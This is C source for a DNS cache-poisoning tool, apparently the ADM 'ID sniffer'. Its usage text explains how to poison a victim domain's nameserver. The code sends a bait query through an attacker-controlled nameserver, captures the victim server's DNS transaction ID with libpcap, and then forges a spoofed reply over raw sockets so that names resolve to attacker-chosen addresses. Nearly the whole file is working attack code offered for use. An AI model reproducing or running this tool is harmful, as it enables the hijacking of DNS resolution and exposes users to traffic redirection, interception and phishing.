#include "ADM-spoof.c"
#include "dns.h"
#include "ADMDNS2.c"
#include <pcap.h>
#include <net/if.h>

#define  DNSHDRSIZE 12
#define  SPOOF      "127.0.0.1"       
#define  VERSION    "ver 0.6 pub"
#define  ERROR      -1

int ETHHDRSIZE;
                     
void main(argc, argv)
int argc;
char *argv[];
   {
   struct pcap_pkthdr h;
   struct pcap *pcap_d;
      	 struct   iphdr  *ip;
	 struct   udphdr *udp;
	 struct   dnshdr *dnsrecv,*dnssend;
	 char            *data;
	 char            *data2;
	 char            *buffer;
         char            namefake[255];
         char            buffer2[1024];
	 char            ebuf[255];
	 char            spoofname[255];
	 char            spoofip[255];
	 char            bla[255];
	 char            dnstrust[255];
	 char            *alacon;
	 unsigned long   s_ipns;
	 unsigned long   d_ip;                     
	 
	 int  sraw, i, on=1, con, ID,DA_ID,type;

srand( (time(NULL) % random() * random()) );


if(argc <2){
  printf("usage : %s <device> <ns.victim.com> <your domain> <IP of ur NS> <type 1,12> <spoofname> <spoof ip> <ns trust> \n",argv[0]); 
  printf("ex: %s eth0 ns.victim.com hacker.org 123.4.5.36 12 damn.diz.ip.iz.ereet.ya mail.pr.example ns2.pr.example  \n",argv[0]);
  printf(" So ... we tryed to poison victim.com with type 12 (PTR) .. now if som1 asked for the ip of mail.pr.example they have resoled to damn.diz.ip.iz.ereet.ya\n"); 
  exit(0);
  }

if(strstr(argv[1],"ppp0"))ETHHDRSIZE = 0;
 else ETHHDRSIZE = 14;

if(argc>5)type=atoi(argv[5]);


if(argc > 6)strcpy(spoofname,argv[6]);
 else{
  printf("enter the name you wanna spoof:");
  scanf("%s",spoofname);
 }
 
 if(argc > 7)strcpy(bla,argv[7]);
 else{
      printf("enter the ip's  of the spoof name:");
      scanf("%s",bla);
    }
                               
 alacon =(char *)inet_ntoa(host2ip(bla));
 strcpy(spoofip,alacon);
                                   
if(argc > 8)strcpy(bla,argv[8]);
else{
    printf("enter the dns trust for the spoof\n");
    scanf("%s",bla);
    }
  alacon =(char *)inet_ntoa(host2ip(bla));
  strcpy(dnstrust,alacon);
   
 
 dnssend = (struct dnshdr  *)buffer2;
 data2   = (char *)(buffer2+DNSHDRSIZE);

 bzero(buffer2,sizeof(buffer2));
   
   
if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
  perror("socket");
  exit(ERROR);
  }
  
if( (setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
 perror("setsockopt");
 exit(ERROR);
 }
 
 printf("ADMsn0ofID.c %s ADM ID sniffer\n",VERSION);
 printf("ADMsnO0fID (\033[5m\033[01mc\033[0m) ADM,Heike\n");
 sleep(1);
 
 pcap_d = pcap_open_live(argv[1],1024,0,100,ebuf);

s_ipns = host2ip(argv[4]);
d_ip   = host2ip(argv[2]);
con    = myrand();

/* make the question for get the ID */

sprintf(namefake,"%d%d%d.%s",myrand(),myrand(),myrand(),argv[3]); 
dnssend->id      = 2600;
dnssend->qr      = 0;
dnssend->rd      = 1;
dnssend->aa      = 0;
dnssend->que_num = htons(1);
dnssend->rep_num = htons(0);
i = makepaketQS(data2,namefake,TYPE_A);
udp_send(sraw, s_ipns, d_ip,2600+con, 53, buffer2, DNSHDRSIZE+i);
printf("Question sended...\n");                                                                
printf("Its Time to w8 \n");

while(1)
{ 
  buffer = (u_char *)pcap_next(pcap_d,&h); /* catch the packet */  
  
  ip      = (struct iphdr   *)(buffer+ETHHDRSIZE);
  udp     = (struct udphdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE);
  dnsrecv = (struct dnshdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE);
  data    = (char *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE+DNSHDRSIZE);

if(ip->protocol == IPPROTO_UDP){
printf("[%s:%i ->",inet_ntoa(ip->saddr),ntohs(udp->source));
printf("%s:%i]\n",inet_ntoa(ip->daddr),ntohs(udp->dest));
}

    if(ip->protocol == 17 )     
      if(ip->saddr.s_addr  == d_ip )
        if(ip->daddr.s_addr == s_ipns ) 
          if(udp->dest  == htons(53) )
            if(dnsrecv->qr == 0 )
             {
             printf("kewl :)~ we have the packet !\n");
             
             ID = dnsrecv->id ;    /* we get the id         */
             
             printf("the current id of %s is %d \n",argv[2],ntohs(ID));
             
             DA_ID = ntohs(ID);
           
    
             printf("send the spoof...\n");
            
             dnsspoof(dnstrust,argv[2],spoofname,spoofip,DA_ID,type); 
           
             printf("spoof sended...\n");
            
             exit(0);
            }    
      
      
 
  }
 
  /* well now we have the ID we cant predict the ID */ 
 
 }
